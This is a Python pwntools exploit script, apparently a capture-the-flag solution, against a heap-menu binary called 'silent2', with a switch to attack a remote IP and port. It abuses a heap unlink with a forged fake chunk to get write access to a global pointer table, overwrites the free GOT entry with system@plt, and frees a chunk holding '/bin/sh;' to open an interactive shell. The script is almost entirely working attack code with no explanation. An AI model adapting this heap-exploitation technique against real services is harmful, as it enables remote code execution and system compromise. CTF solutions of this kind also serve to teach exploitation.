#!/usr/bin python
from pwn import *

debug = 1
if debug:
	p = process('./silent2')
	context.log_level = "debug"
else:
	p = remote('39.107.32.132', 10000)

def add(size, content):
	p.sendline('1')
	p.sendline(str(size))
	p.send(content)
	if not debug:
		raw_input("g0")
	

def edit(index, content):
	p.sendline('3')
	p.sendline(str(index))
	p.send(content)
	p.send('A'*47)
	if not debug:
		raw_input("g0")
	

def delete(index):
	p.sendline('2')
	
	p.sendline(str(index))
	if not debug:
		raw_input("g0")
	
sleep(1)
add(0xa0, '0'*100 + '\n') #0
add(0xa0, '1'*100 + '\n') #1
add(0xa0, '2'*100 + '\n') #2

add(0xa0, 'a'*100 + '\n') #3

add(0xa0, 'b'*100 + '\n') #4
add(0xa0, '/bin/sh;' + 'c'*100 + '\n') #5

delete(3)
delete(4)

ptr_addr = 0x6020C0 + 0x18
payload = p64(0) + p64(0xa1) + p64(ptr_addr-0x18) + p64(ptr_addr-0x10) + 'a'*0x80 + p64(0xa0) + p64(0xb0)
add(0x140, payload + 'd'*100 + '\n') #6

delete(4)
#*0x6020d8 = 0x6020c0
#s
free_got = 0x602018
system_plt = 0x400730

payload1 =  p32(free_got)
edit(3, '\x18\x20\x60\x00')
#gdb.attach(p)
edit(0, '\x30\x07\x40\x00\x00\x00')

delete(5)

p.interactive()
